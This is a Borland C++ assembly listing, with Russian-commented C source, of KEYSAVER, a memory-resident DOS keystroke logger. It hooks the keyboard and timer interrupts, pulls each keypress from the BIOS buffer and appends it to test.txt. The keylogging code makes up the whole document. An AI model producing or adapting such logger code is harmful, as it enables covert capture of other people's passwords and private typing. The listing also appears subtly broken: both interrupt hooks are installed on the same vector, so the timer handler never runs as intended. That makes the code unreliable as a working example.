	ifndef	??version
?debug	macro
	endm
publicdll macro	name
	public	name
	endm
	endif
	?debug	V 300h
	?debug	S "KEYSAVER.CPP"
	?debug	C E96E6539280C4B455953415645522E435050
	?debug	C E94019CA1822443A5C44454C5048495C424F524C414E44435C494E+
	?debug	C 434C5544455C535444494F2E48
	?debug	C E94019CA1822443A5C44454C5048495C424F524C414E44435C494E+
	?debug	C 434C5544455C5F444546532E48
	?debug	C E94019CA1823443A5C44454C5048495C424F524C414E44435C494E+
	?debug	C 434C5544455C5F4E46494C452E48
	?debug	C E94019CA1822443A5C44454C5048495C424F524C414E44435C494E+
	?debug	C 434C5544455C5F4E554C4C2E48
	?debug	C E94019CA1823443A5C44454C5048495C424F524C414E44435C494E+
	?debug	C 434C5544455C535452494E472E48
	?debug	C E94019CA1823443A5C44454C5048495C424F524C414E44435C494E+
	?debug	C 434C5544455C5354444C49422E48
	?debug	C E94019CA1820443A5C44454C5048495C424F524C414E44435C494E+
	?debug	C 434C5544455C444F532E48
_TEXT	segment byte public 'CODE'
_TEXT	ends
DGROUP	group	_DATA,_BSS
	assume	cs:_TEXT,ds:DGROUP
_DATA	segment word public 'DATA'
d@	label	byte
d@w	label	word
_DATA	ends
_BSS	segment word public 'BSS'
b@	label	byte
b@w	label	word
_Old_9h	label	dword
	db	4 dup (?)
_Old_8h	label	dword
	db	4 dup (?)
_in_dos	label	word
	db	4 dup (?)
_Last_Key	label	word
	db	512 dup (?)
_Curr_Key	label	word
	db	2 dup (?)
_Curr_Key_for8	label	word
	db	2 dup (?)
_Curr_Key_for9	label	word
	db	2 dup (?)
_BSS	ends
_DATA	segment word public 'DATA'
_NotWrited	label	byte
	db	0
_filename	label	byte
	db	116
	db	101
	db	115
	db	116
	db	46
	db	116
	db	120
	db	116
	db	0
_DATA	ends
_BSS	segment word public 'BSS'
_handle	label	word
	db	2 dup (?)
_BSS	ends
_DATA	segment word public 'DATA'
_addstr	label	byte
	db	0
_DATA	ends
_BSS	segment word public 'BSS'
_len_this	label	word
	db	2 dup (?)
_BSS	ends
_TEXT	segment byte public 'CODE'
	?debug	C E8010C4B455953415645522E4350506E653928
   ;	
   ;	void addtofile()
   ;	
	?debug	L 28
	assume	cs:_TEXT
@addtofile$qv	proc	near
	?debug	B
	push	bp
	mov	bp,sp
	sub	sp,2
	?debug	B
   ;	
   ;	{
   ;	//************* Работа с DOS функциями *********************
   ;	Curr_Key=Curr_Key_for8;
   ;	
	?debug	L 31
	mov	ax,word ptr DGROUP:_Curr_Key_for8
	mov	word ptr DGROUP:_Curr_Key,ax
   ;	
   ;	
   ;	switch (Curr_Key)
   ;	
	?debug	L 33
	mov	ax,word ptr DGROUP:_Curr_Key
	mov	word ptr [bp-2],ax
	mov	cx,17
	mov	bx,offset @1@C1202
@1@114:
	mov	ax,word ptr cs:[bx]
	cmp	ax,word ptr [bp-2]
	je	short @1@198
	add	bx,2
	loop	short @1@114
	jmp	@1@730
@1@198:
	jmp	word ptr cs:[bx+34]
@1@226:
   ;	
   ;	   {
   ;	   case 0x1000: setvect(INTR, Old_9h);          //Alt-Q выход
   ;	
	?debug	L 35
	push	word ptr DGROUP:_Old_9h+2
	push	word ptr DGROUP:_Old_9h
	mov	ax,9
	push	ax
	call	near ptr _setvect
	add	sp,6
   ;	
   ;			setvect(INTR, Old_8h);
   ;	
	?debug	L 36
	push	word ptr DGROUP:_Old_8h+2
	push	word ptr DGROUP:_Old_8h
	mov	ax,9
	push	ax
	call	near ptr _setvect
	add	sp,6
   ;	
   ;			exit(0);		//Выходит сразу из Nortona. Это удобно.
   ;	
	?debug	L 37
	xor	ax,ax
	push	ax
	call	near ptr _exit
	pop	cx
@1@254:
   ;	
   ;	   case 0x3B00: strcpy(addstr, "F1"); 		break;
   ;	
	?debug	L 38
	mov	ax,offset DGROUP:s@
@1@282:
	push	ax
	mov	ax,offset DGROUP:_addstr
	push	ax
	call	near ptr _strcpy
	pop	cx
	pop	cx
	jmp	@1@954
@1@310:
   ;	
   ;	   case 0x3C00: strcpy(addstr, "F2");		break;
   ;	
	?debug	L 39
	mov	ax,offset DGROUP:s@+3
	jmp	short @1@282
@1@338:
   ;	
   ;	   case 0x3D00: strcpy(addstr, "F3");		break;
   ;	
	?debug	L 40
	mov	ax,offset DGROUP:s@+6
	jmp	short @1@282
@1@366:
   ;	
   ;	   case 0x3E00: strcpy(addstr, "F4");		break;
   ;	
	?debug	L 41
	mov	ax,offset DGROUP:s@+9
	jmp	short @1@282
@1@394:
   ;	
   ;	   case 0x3F00: strcpy(addstr, "F5");		break;
   ;	
	?debug	L 42
	mov	ax,offset DGROUP:s@+12
	jmp	short @1@282
@1@422:
   ;	
   ;	   case 0x4040: strcpy(addstr, "F6");		break;
   ;	
	?debug	L 43
	mov	ax,offset DGROUP:s@+15
	jmp	short @1@282
@1@450:
   ;	
   ;	   case 0x4100: strcpy(addstr, "F7");		break;
   ;	
	?debug	L 44
	mov	ax,offset DGROUP:s@+18
	jmp	short @1@282
@1@478:
   ;	
   ;	   case 0x4200: strcpy(addstr, "F8");		break;
   ;	
	?debug	L 45
	mov	ax,offset DGROUP:s@+21
	jmp	short @1@282
@1@506:
   ;	
   ;	   case 0x4300: strcpy(addstr, "F9");		break;
   ;	
	?debug	L 46
	mov	ax,offset DGROUP:s@+24
	jmp	short @1@282
@1@534:
   ;	
   ;	   case 0x4400: strcpy(addstr, "F10");		break;
   ;	
	?debug	L 47
	mov	ax,offset DGROUP:s@+27
	jmp	short @1@282
@1@562:
   ;	
   ;	   case 0x4700: strcpy(addstr, "Home");		break;
   ;	
	?debug	L 48
	mov	ax,offset DGROUP:s@+31
	jmp	short @1@282
@1@590:
   ;	
   ;	   case 0x0e08: strcpy(addstr, "BackSpace");	break;
   ;	
	?debug	L 49
	mov	ax,offset DGROUP:s@+36
	jmp	short @1@282
@1@618:
   ;	
   ;	   case 0x0f09: strcpy(addstr, "Tab");		break;
   ;	
	?debug	L 50
	mov	ax,offset DGROUP:s@+46
	jmp	short @1@282
@1@646:
   ;	
   ;	//   case 0x3600: strcpy(addstr, "RightShift");	break;
   ;	//   case 0x3800: strcpy(addstr, "Alt");       	break;
   ;	//   case 0x1D00: strcpy(addstr, "Ctrl");    	break;
   ;	//   case 0x3a00: strcpy(addstr, "CapsLock");	break;
   ;	   case 0x1C0D: strcpy(addstr, "Enter"); 	break;
   ;	
	?debug	L 55
	mov	ax,offset DGROUP:s@+50
	jmp	short @1@282
@1@674:
   ;	
   ;	   case 0x3920: strcpy(addstr, "Space");	break;
   ;	
	?debug	L 56
	mov	ax,offset DGROUP:s@+56
	jmp	short @1@282
@1@702:
   ;	
   ;	   case 0x011B: strcpy(addstr, "Esc");	  	break;
   ;	
	?debug	L 57
	mov	ax,offset DGROUP:s@+62
	jmp	short @1@282
@1@730:
   ;	
   ;	   default:
   ;		   if (Curr_Key >= 0x8000 || Curr_Key < 0x0200) { goto NotWriteThis; }
   ;	
	?debug	L 59
	cmp	word ptr DGROUP:_Curr_Key,-32768
	jae	short @1@786
	cmp	word ptr DGROUP:_Curr_Key,512
	jae	short @1@814
@1@786:
	jmp	@1@1514
@1@814:
   ;	
   ;		   if (Curr_Key -((unsigned int)(Curr_Key/256))*256 < 0x20) { goto NotWriteThis; }
   ;	
	?debug	L 60
	mov	ax,word ptr DGROUP:_Curr_Key
	mov	cl,8
	shr	ax,cl
	mov	cl,8
	shl	ax,cl
	mov	dx,word ptr DGROUP:_Curr_Key
	sub	dx,ax
	cmp	dx,32
	jae	short @1@870
	jmp	@1@1514
@1@870:
   ;	
   ;		   if (Curr_Key -((unsigned int)(Curr_Key/256))*256 >= 0x80) { goto NotWriteThis; }
   ;	
	?debug	L 61
	mov	ax,word ptr DGROUP:_Curr_Key
	mov	cl,8
	shr	ax,cl
	mov	cl,8
	shl	ax,cl
	mov	dx,word ptr DGROUP:_Curr_Key
	sub	dx,ax
	cmp	dx,128
	jb	short @1@926
	jmp	@1@1514
@1@926:
   ;	
   ;		   addstr[0]=Curr_Key-((unsigned int)(Curr_Key/256))*256;
   ;	
	?debug	L 62
	mov	ax,word ptr DGROUP:_Curr_Key
	mov	cl,8
	shr	ax,cl
	mov	cl,8
	shl	al,cl
	mov	dl,byte ptr DGROUP:_Curr_Key
	sub	dl,al
	mov	byte ptr DGROUP:_addstr,dl
   ;	
   ;		   addstr[1]=0;
   ;	
	?debug	L 63
	mov	byte ptr DGROUP:_addstr+1,0
@1@954:
   ;	
   ;	   }
   ;	
   ;	   len_this=strlen(addstr);
   ;	
	?debug	L 66
	mov	ax,offset DGROUP:_addstr
	push	ax
	call	near ptr _strlen
	pop	cx
	mov	word ptr DGROUP:_len_this,ax
   ;	
   ;	
   ;	/*asm mov AH, 0x51           //Сохраняем старый PSP
   ;	asm int 0x21
   ;	asm push BX
   ;	asm mov AH, 0x50           //Настраиваем PSP на наш сегмент
   ;	asm mov BX, CS
   ;	asm int 0x21*/
   ;	
   ;	asm mov AH, 0x3D                  //Открываем, записываем и закрываем файл.
   ;	
	?debug	L 75
 	mov	 AH, 03DH                  
   ;	
   ;	asm mov AL, 1
   ;	
	?debug	L 76
 	mov	 AL, 1
   ;	
   ;	asm mov DX, offset filename
   ;	
	?debug	L 77
 	mov	 DX, offset DGROUP:_filename
   ;	
   ;	asm int 0x21
   ;	
	?debug	L 78
 	int	 021H
   ;	
   ;	asm mov handle, AX
   ;	
	?debug	L 79
 	mov	 DGROUP:_handle, AX
   ;	
   ;	
   ;	asm mov AH, 0x42
   ;	
	?debug	L 81
 	mov	 AH, 042H
   ;	
   ;	asm mov AL, 2
   ;	
	?debug	L 82
 	mov	 AL, 2
   ;	
   ;	asm mov BX, handle
   ;	
	?debug	L 83
 	mov	 BX, DGROUP:_handle
   ;	
   ;	asm mov CX, 0
   ;	
	?debug	L 84
 	mov	 CX, 0
   ;	
   ;	asm mov DX, 0
   ;	
	?debug	L 85
 	mov	 DX, 0
   ;	
   ;	asm int 0x21
   ;	
	?debug	L 86
 	int	 021H
   ;	
   ;	
   ;	/*asm mov AH, 0x40
   ;	asm mov BX, handle
   ;	asm mov CX, 1
   ;	asm mov DX, offset little
   ;	asm int 0x21*/
   ;	
   ;	asm mov AH, 0x40
   ;	
	?debug	L 94
 	mov	 AH, 040H
   ;	
   ;	asm mov BX, handle
   ;	
	?debug	L 95
 	mov	 BX, DGROUP:_handle
   ;	
   ;	asm mov CX, len_this
   ;	
	?debug	L 96
 	mov	 CX, DGROUP:_len_this
   ;	
   ;	asm mov DX, offset addstr
   ;	
	?debug	L 97
 	mov	 DX, offset DGROUP:_addstr
   ;	
   ;	asm int 0x21
   ;	
	?debug	L 98
 	int	 021H
   ;	
   ;	
   ;	asm mov AH, 0x3E
   ;	
	?debug	L 100
 	mov	 AH, 03EH
   ;	
   ;	asm mov BX, handle
   ;	
	?debug	L 101
 	mov	 BX, DGROUP:_handle
   ;	
   ;	asm int 0x21
   ;	
	?debug	L 102
 	int	 021H
@1@1514:
   ;	
   ;	
   ;	/*asm pop BX
   ;	asm mov AH, 50
   ;	asm int 0x21*/
   ;	
   ;	NotWriteThis:
   ;	return;
   ;	
	?debug	L 109
	jmp	short @1@1542
@1@1542:
   ;	
   ;	}
   ;	
	?debug	L 110
	mov	sp,bp
	pop	bp
	ret	
	?debug	E
	?debug	E
@addtofile$qv	endp
@1@C1202	label	word
	db	27
	db	1
	db	8
	db	14
	db	9
	db	15
	db	0
	db	16
	db	13
	db	28
	db	32
	db	57
	db	0
	db	59
	db	0
	db	60
	db	0
	db	61
	db	0
	db	62
	db	0
	db	63
	db	64
	db	64
	db	0
	db	65
	db	0
	db	66
	db	0
	db	67
	db	0
	db	68
	db	0
	db	71
	dw	@1@702
	dw	@1@590
	dw	@1@618
	dw	@1@226
	dw	@1@646
	dw	@1@674
	dw	@1@254
	dw	@1@310
	dw	@1@338
	dw	@1@366
	dw	@1@394
	dw	@1@422
	dw	@1@450
	dw	@1@478
	dw	@1@506
	dw	@1@534
	dw	@1@562
   ;	
   ;	void interrupt New_8h(__CPPARGS)
   ;	
	?debug	L 112
	assume	cs:_TEXT
@New_8h$qve	proc	far
	?debug	B
	push	ax
	push	bx
	push	cx
	push	dx
	push	es
	push	ds
	push	si
	push	di
	push	bp
	mov	bp,DGROUP
	mov	ds,bp
	mov	bp,sp
	?debug	B
   ;	
   ;	{
   ;	Old_8h();
   ;	
	?debug	L 114
	pushf	
	call	dword ptr DGROUP:_Old_8h
   ;	
   ;	
   ;	asm mov AX, 0xB800          //Индикатор работы
   ;	
	?debug	L 116
 	mov	 AX, 0B800H          
   ;	
   ;	asm mov ES, AX
   ;	
	?debug	L 117
 	mov	 ES, AX
   ;	
   ;	asm mov AX, word ptr DS:NotWrited
   ;	
	?debug	L 118
 	mov	 AX, word ptr DS:DGROUP:_NotWrited
   ;	
   ;	asm mov ES:[0x00], AX
   ;	
	?debug	L 119
 	mov	 ES:[000H], AX
   ;	
   ;	
   ;	if (NotWrited)
   ;	
	?debug	L 121
	cmp	byte ptr DGROUP:_NotWrited,0
	je	short @2@254
   ;	
   ;	   {
   ;	   if (peekb((unsigned int)(in_dos/65536), in_dos-((unsigned int)(in_dos/65536))*65536)==0)
   ;	
	?debug	L 123
	mov	ax,word ptr DGROUP:_in_dos+2
	mov	cl,16
	shl	ax,cl
	mov	dx,word ptr DGROUP:_in_dos
	sub	dx,ax
	push	dx
	push	word ptr DGROUP:_in_dos+2
	call	near ptr @peekb
	pop	cx
	pop	cx
	or	al,al
	jne	short @2@254
   ;	
   ;	      {                             //DOS свободна? Да - пишем.
   ;	      Curr_Key_for8=Last_Key[NotWrited];
   ;	
	?debug	L 125
	mov	al,byte ptr DGROUP:_NotWrited
	mov	ah,0
	shl	ax,1
	mov	bx,ax
	mov	ax,word ptr DGROUP:_Last_Key[bx]
	mov	word ptr DGROUP:_Curr_Key_for8,ax
   ;	
   ;	      addtofile();
   ;	
	?debug	L 126
	call	near ptr @addtofile$qv
   ;	
   ;	      NotWrited--;
   ;	
	?debug	L 127
	dec	byte ptr DGROUP:_NotWrited
@2@254:
   ;	
   ;	      }
   ;	   }
   ;	}
   ;	
	?debug	L 130
	pop	bp
	pop	di
	pop	si
	pop	ds
	pop	es
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	iret	
	?debug	E
	?debug	E
@New_8h$qve	endp
   ;	
   ;	void interrupt New_9h(__CPPARGS)
   ;	
	?debug	L 132
	assume	cs:_TEXT
@New_9h$qve	proc	far
	?debug	B
	push	ax
	push	bx
	push	cx
	push	dx
	push	es
	push	ds
	push	si
	push	di
	push	bp
	mov	bp,DGROUP
	mov	ds,bp
	mov	bp,sp
	sub	sp,2
	?debug	B
   ;	
   ;	{
   ;	Old_9h();
   ;	
	?debug	L 134
	pushf	
	call	dword ptr DGROUP:_Old_9h
   ;	
   ;	
   ;	asm mov AX, 0xB800          //Индикатор работы
   ;	
	?debug	L 136
 	mov	 AX, 0B800H          
   ;	
   ;	asm mov ES, AX
   ;	
	?debug	L 137
 	mov	 ES, AX
   ;	
   ;	asm mov AX, word ptr DS:NotWrited
   ;	
	?debug	L 138
 	mov	 AX, word ptr DS:DGROUP:_NotWrited
   ;	
   ;	asm mov ES:[0x02], AX
   ;	
	?debug	L 139
 	mov	 ES:[002H], AX
   ;	
   ;	
   ;	asm mov AX, 0x0040          //Переслать в AX последний символ из буфера
   ;	
	?debug	L 141
 	mov	 AX, 00040H          
   ;	
   ;	asm mov ES, AX
   ;	
	?debug	L 142
 	mov	 ES, AX
   ;	
   ;	asm mov BX, ES:0x1A
   ;	
	?debug	L 143
 	mov	 BX, ES:01AH
   ;	
   ;	asm mov AX, ES:[BX]
   ;	
	?debug	L 144
 	mov	 AX, ES:[BX]
   ;	
   ;	
   ;	Curr_Key_for9=_AX;
   ;	
	?debug	L 146
	mov	word ptr DGROUP:_Curr_Key_for9,ax
   ;	
   ;	
   ;	/*if (peekb(in_dos-((unsigned int)(in_dos/256))*256, (unsigned int)(in_dos/256))==0 && NotWrited=0)
   ;	   {                                 //DOS свободна?
   ;	   addtofile();
   ;	   goto ToHome;
   ;	   }*/
   ;	
   ;	NotWrited++;                    //Нет - задание таймеру
   ;	
	?debug	L 154
	inc	byte ptr DGROUP:_NotWrited
   ;	
   ;	if (NotWrited >= 254)              //сброс буфера при переполнении
   ;	
	?debug	L 155
	cmp	byte ptr DGROUP:_NotWrited,254
	jb	short @3@338
   ;	
   ;	   {
   ;	   NotWrited=1;
   ;	
	?debug	L 157
	mov	byte ptr DGROUP:_NotWrited,1
@3@338:
   ;	
   ;	   }
   ;	
   ;	for (int i=NotWrited;i>1;i--)
   ;	
	?debug	L 160
	mov	al,byte ptr DGROUP:_NotWrited
	mov	ah,0
	mov	word ptr [bp-2],ax
	jmp	short @3@422
@3@366:
   ;	
   ;	    {
   ;	    Last_Key[i]=Last_Key[i-1];
   ;	
	?debug	L 162
	mov	bx,word ptr [bp-2]
	shl	bx,1
	mov	ax,word ptr DGROUP:_Last_Key[bx-2]
	mov	bx,word ptr [bp-2]
	shl	bx,1
	mov	word ptr DGROUP:_Last_Key[bx],ax
	?debug	L 160
	dec	word ptr [bp-2]
@3@422:
	cmp	word ptr [bp-2],1
	jg	short @3@366
   ;	
   ;	    }
   ;	Last_Key[1]=Curr_Key_for9;
   ;	
	?debug	L 164
	mov	ax,word ptr DGROUP:_Curr_Key_for9
	mov	word ptr DGROUP:_Last_Key+2,ax
   ;	
   ;	//ToHome:
   ;	}
   ;	
	?debug	L 166
	mov	sp,bp
	pop	bp
	pop	di
	pop	si
	pop	ds
	pop	es
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	iret	
	?debug	C E601690402FEFF00
	?debug	E
	?debug	E
@New_9h$qve	endp
   ;	
   ;	int main()
   ;	
	?debug	L 168
	assume	cs:_TEXT
_main	proc	near
	?debug	B
	push	bp
	mov	bp,sp
	?debug	B
   ;	
   ;	{
   ;	/*asm mov AH, 0x3C
   ;	asm mov CX, 0
   ;	asm mov AL, 0
   ;	asm mov DX, word ptr filename
   ;	asm int 0x21
   ;	asm mov handle, AX
   ;	
   ;	asm mov AH, 0x3E
   ;	asm mov BX, handle
   ;	asm int 0x21*/
   ;	
   ;	asm mov AH, 0x34                 //Получим адрес флага занятости DOS
   ;	
	?debug	L 181
 	mov	 AH, 034H                 
   ;	
   ;	asm int 0x21
   ;	
	?debug	L 182
 	int	 021H
   ;	
   ;	asm mov word ptr DS:in_dos, BX
   ;	
	?debug	L 183
 	mov	 word ptr DS:DGROUP:_in_dos, BX
   ;	
   ;	asm mov word ptr DS:in_dos+2, ES
   ;	
	?debug	L 184
 	mov	 word ptr DS:DGROUP:_in_dos+2, ES
   ;	
   ;	
   ;	Old_8h=getvect(INTR);            //Поменяем 8-ое и 9-ое прерывание на свои
   ;	
	?debug	L 186
	mov	ax,9
	push	ax
	call	near ptr _getvect
	pop	cx
	mov	word ptr DGROUP:_Old_8h+2,dx
	mov	word ptr DGROUP:_Old_8h,ax
   ;	
   ;	setvect(INTR, New_8h);
   ;	
	?debug	L 187
	mov	ax,seg @New_8h$qve
	push	ax
	mov	ax,offset @New_8h$qve
	push	ax
	mov	ax,9
	push	ax
	call	near ptr _setvect
	add	sp,6
   ;	
   ;	
   ;	Old_9h=getvect(INTR);
   ;	
	?debug	L 189
	mov	ax,9
	push	ax
	call	near ptr _getvect
	pop	cx
	mov	word ptr DGROUP:_Old_9h+2,dx
	mov	word ptr DGROUP:_Old_9h,ax
   ;	
   ;	setvect(INTR, New_9h);
   ;	
	?debug	L 190
	mov	ax,seg @New_9h$qve
	push	ax
	mov	ax,offset @New_9h$qve
	push	ax
	mov	ax,9
	push	ax
	call	near ptr _setvect
	add	sp,6
   ;	
   ;	
   ;	printf("Вектора 8 и 9 перехвачены.\n");
   ;	
	?debug	L 192
	mov	ax,offset DGROUP:s@+66
	push	ax
	call	near ptr _printf
	pop	cx
   ;	
   ;	
   ;	keep(0, _SS + (_SP/16) - _psp);
   ;	
	?debug	L 194
	mov	ax,sp
	mov	cl,4
	shr	ax,cl
	mov	dx,ss
	add	dx,ax
	sub	dx,word ptr DGROUP:__psp
	push	dx
	mov	al,0
	push	ax
	call	near ptr _keep
	pop	cx
	pop	cx
   ;	
   ;	return 0;
   ;	
	?debug	L 195
	xor	ax,ax
	jmp	short @4@170
@4@170:
   ;	
   ;	}
   ;	
	?debug	L 196
	pop	bp
	ret	
	?debug	E
	?debug	E
_main	endp
_TEXT	ends
_TEXT	segment byte public 'CODE'
@peekb$quiui	segment	virtual
	?debug	C E80220443A5C44454C5048495C424F524C414E44+
	?debug	C 435C494E434C5544455C444F532E484019CA18
   ;	
   ;	
   ;	
	?debug	L 491
	assume	cs:_TEXT
@peekb	proc	near
	?debug	B
	push	bp
	mov	bp,sp
	?debug	C E6085F5F6F66667365740A0A060000095F5F7365+
	?debug	C 676D656E740A0A040000
	?debug	B
   ;	
   ;	
   ;	
	?debug	L 492
	mov	es,word ptr [bp+4]
	mov	bx,word ptr [bp+6]
	mov	al,byte ptr es:[bx]
	jmp	short @5@58
@5@58:
	pop	bp
	ret	
	?debug	C E6095F5F7365676D656E740A0A040000085F5F6F+
	?debug	C 66667365740A0A060000
	?debug	E
	?debug	E
@peekb	endp
	?debug	C E9
	?debug	C FA00000000
@peekb$quiui	ends
_TEXT	ends
_DATA	segment word public 'DATA'
s@	label	byte
	db	'F1'
	db	0
	db	'F2'
	db	0
	db	'F3'
	db	0
	db	'F4'
	db	0
	db	'F5'
	db	0
	db	'F6'
	db	0
	db	'F7'
	db	0
	db	'F8'
	db	0
	db	'F9'
	db	0
	db	'F10'
	db	0
	db	'Home'
	db	0
	db	'BackSpace'
	db	0
	db	'Tab'
	db	0
	db	'Enter'
	db	0
	db	'Space'
	db	0
	db	'Esc'
	db	0
	db	130
	db	165
	db	170
	db	226
	db	174
	db	224
	db	160
	db	' 8 '
	db	168
	db	' 9 '
	db	175
	db	165
	db	224
	db	165
	db	229
	db	162
	db	160
	db	231
	db	165
	db	173
	db	235
	db	'.'
	db	10
	db	0
_DATA	ends
_TEXT	segment byte public 'CODE'
_TEXT	ends
	public	_main
	public	@New_9h$qve
	public	@New_8h$qve
	public	@addtofile$qv
	public	_len_this
	public	_addstr
	public	_handle
	public	_filename
	public	_NotWrited
	public	_Curr_Key_for9
	public	_Curr_Key_for8
	public	_Curr_Key
	public	_Last_Key
	public	_in_dos
	public	_Old_8h
	public	_Old_9h
	extrn	_setvect:near
	extrn	_getvect:near
_pokeb	equ	pokeb
_poke	equ	poke
@_peekb	equ	@peekb
_peek	equ	peek
	extrn	_keep:near
	extrn	__psp:word
	extrn	_exit:near
_atoi	equ	atoi
_abs	equ	abs
	extrn	_strlen:near
	extrn	_strcpy:near
	extrn	_printf:near
_s@	equ	s@
	?debug	C EA0509
	?debug	C E31800000023040000
	?debug	C EC055F6D61696E181800
	?debug	C E31900000023010701
	?debug	C EC0B404E65775F396824717665199800
	?debug	C E31A00000023010701
	?debug	C EC0B404E65775F3868247176651A9800
	?debug	C E31B00000023010000
	?debug	C EC0D40616464746F66696C652471761B1800
	?debug	C EC095F6C656E5F746869730A0000
	?debug	C E31C0001001A02
	?debug	C EC075F6164647374721C0000
	?debug	C EC075F68616E646C650A0000
	?debug	C E31D0009001A02
	?debug	C EC095F66696C656E616D651D0000
	?debug	C EC0A5F4E6F74577269746564080000
	?debug	C EC0E5F437572725F4B65795F666F72390A0000
	?debug	C EC0E5F437572725F4B65795F666F72380A0000
	?debug	C EC095F437572725F4B65790A0000
	?debug	C E31E0000021A0A
	?debug	C EC095F4C6173745F4B65791E0000
	?debug	C EC075F696E5F646F730C0000
	?debug	C E32000000023010701
	?debug	C E31F000400162000
	?debug	C EC075F4F6C645F38681F0000
	?debug	C E32200000023010701
	?debug	C E321000400162200
	?debug	C EC075F4F6C645F3968210000
	?debug	C E32300000023010000
	?debug	C EB085F736574766563742300
	?debug	C E32600000023010701
	?debug	C E325000400162600
	?debug	C E32400000023250000
	?debug	C EB085F676574766563742400
	?debug	C E32700000023010000
	?debug	C E32800000023010000
	?debug	C E32900000023020000
	?debug	C EC057065656B62291800
	?debug	C E32A00000023040000
	?debug	C E32B00000023010000
	?debug	C EB055F6B6565702B00
	?debug	C E32C0666696E645F742B001E01
	?debug	C E32D0015001A02
	?debug	C E32E000D001A02
	?debug	C E32F056666626C6B2B001E08
	?debug	C E3300015001A02
	?debug	C E331000D001A02
	?debug	C E332075245475041434B14001E0F
	?debug	C E33305535245475308001E1A
	?debug	C E334045245475310001F1F
	?debug	C E33508574F52445245475310001E22
	?debug	C E33608425954455245475308001E2B
	?debug	C E33709646F73646174655F7405001E34
	?debug	C E338046461746504001E39
	?debug	C E33909646F7374696D655F7404001E3D
	?debug	C E33A0474696D6504001E42
	?debug	C E33B0664657668647212001E47
	?debug	C E33C0008001A02
	?debug	C E33D07666174696E666F06001E4D
	?debug	C E33E0A6469736B667265655F7408001E52
	?debug	C E33F05646672656508001E57
	?debug	C E34008444F534552524F5205001E5C
	?debug	C E34107434F554E54525922001E61
	?debug	C E3420005001A02
	?debug	C E3430002001A02
	?debug	C E3440002001A02
	?debug	C E3450002001A02
	?debug	C E3460002001A02
	?debug	C E3470002001A02
	?debug	C E348000A001A02
	?debug	C E34904786663622C001E6E
	?debug	C E34A0005001A02
	?debug	C E34B0366636225001E73
	?debug	C E34C0008001A02
	?debug	C E34D0003001A02
	?debug	C E34E000A001A02
	?debug	C E34F00000023010000
	?debug	C E35000000023040000
	?debug	C EB055F5F7073700A00
	?debug	C E35100000023010000
	?debug	C EB055F657869745100
	?debug	C E35200000023040000
	?debug	C E35300000023040000
	?debug	C E354000000230A0000
	?debug	C EB075F7374726C656E5400
	?debug	C E356000200150204
	?debug	C E35500000023560000
	?debug	C EB075F7374726370795500
	?debug	C E35700000023040001
	?debug	C EB075F7072696E74665700
	?debug	C E60777636861725F740206000666706F735F7406+
	?debug	C 06000673697A655F740A06000666696E645F742C+
	?debug	C 0700056666626C6B2F0700075245475041434B32+
	?debug	C 0700055352454753330700045245475334070008+
	?debug	C 425954455245475336070008574F524452454753+
	?debug	C 35070009646F73646174655F7437070004646174+
	?debug	C 6538070009646F7374696D655F74390700047469+
	?debug	C 6D653A0700066465766864723B07000766617469+
	?debug	C 6E666F3D07000A6469736B667265655F743E0700+
	?debug	C 0564667265653F070008444F534552524F524007+
	?debug	C 0007434F554E5452594107000478666362490700+
	?debug	C 036663624B0700
	?debug	F pokeb 39 24 0
	?debug	F poke 40 24 0
	?debug	F peek 42 24 0
	?debug	F @randomize$qv 79 24 0
	?debug	F @random$qi 80 24 0
	?debug	F atoi 82 24 0
	?debug	F abs 83 24 0
	?debug	C E2000872657365727665642D0006617474726962+
	?debug	C 02000777725F74696D650A000777725F64617465+
	?debug	C 0A000473697A650600046E616D652EC02B000000
	?debug	C E2000B66665F726573657276656430000966665F+
	?debug	C 61747472696202000866665F6674696D650A0008+
	?debug	C 66665F66646174650A000866665F6673697A6506+
	?debug	C 000766665F6E616D6531C02B000000
	?debug	C E20004725F61780A0004725F62780A0004725F63+
	?debug	C 780A0004725F64780A0004725F62700A0004725F+
	?debug	C 73690A0004725F64690A0004725F64730A000472+
	?debug	C 5F65730A0007725F666C6167730AC014000000
	?debug	C E2000265730A000263730A000273730A00026473+
	?debug	C 0AC008000000
	?debug	C E20001783500016836C010000000
	?debug	C E2000261780A000262780A000263780A00026478+
	?debug	C 0A000273690A000264690A000563666C61670A00+
	?debug	C 05666C6167730AC010000000
	?debug	C E20002616C0800026168080002626C0800026268+
	?debug	C 080002636C0800026368080002646C0800026468+
	?debug	C 08C008000000
	?debug	C E200036461790800056D6F6E7468080004796561+
	?debug	C 720A00096461796F667765656B08C005000000
	?debug	C E2000764615F7965617204000664615F64617902+
	?debug	C 000664615F6D6F6E02C004000000
	?debug	C E20004686F75720800066D696E75746508000673+
	?debug	C 65636F6E64080007687365636F6E6408C0040000+
	?debug	C 00
	?debug	C E2000674695F6D696E08000774695F686F757208+
	?debug	C 000774695F68756E6408000674695F73656308C0+
	?debug	C 04000000
	?debug	C E2000764685F6E65787406000764685F61747472+
	?debug	C 04000864685F73747261740A000864685F696E74+
	?debug	C 65720A000764685F6E616D653CC012000000
	?debug	C E2000866695F73636C757302000866695F666174+
	?debug	C 696402000866695F6E636C75730A000866695F62+
	?debug	C 7973656304C006000000
	?debug	C E2000E746F74616C5F636C7573746572730A000E+
	?debug	C 617661696C5F636C7573746572730A0013736563+
	?debug	C 746F72735F7065725F636C75737465720A001062+
	?debug	C 797465735F7065725F736563746F720AC0080000+
	?debug	C 00
	?debug	C E2000864665F617661696C0A000864665F746F74+
	?debug	C 616C0A000764665F627365630A000864665F7363+
	?debug	C 6C75730AC008000000
	?debug	C E2000B64655F6578746572726F7204000864655F+
	?debug	C 636C61737302000964655F616374696F6E020008+
	?debug	C 64655F6C6F63757302C005000000
	?debug	C E20007636F5F64617465040007636F5F63757272+
	?debug	C 420008636F5F7468736570430008636F5F646573+
	?debug	C 6570440008636F5F6474736570450008636F5F74+
	?debug	C 6D73657046000C636F5F637572727374796C6502+
	?debug	C 0009636F5F646967697473020007636F5F74696D+
	?debug	C 65020007636F5F63617365060008636F5F646173+
	?debug	C 6570470007636F5F66696C6C48C022000000
	?debug	C E20009786663625F666C6167020009786663625F+
	?debug	C 726573764A0009786663625F6174747202000878+
	?debug	C 6663625F6663624BC02C000000
	?debug	C E200096663625F64726976650200086663625F6E+
	?debug	C 616D654C00076663625F6578744D000A6663625F+
	?debug	C 637572626C6B04000B6663625F72656373697A65+
	?debug	C 04000B6663625F66696C73697A65060008666362+
	?debug	C 5F646174650400086663625F726573764E000A66+
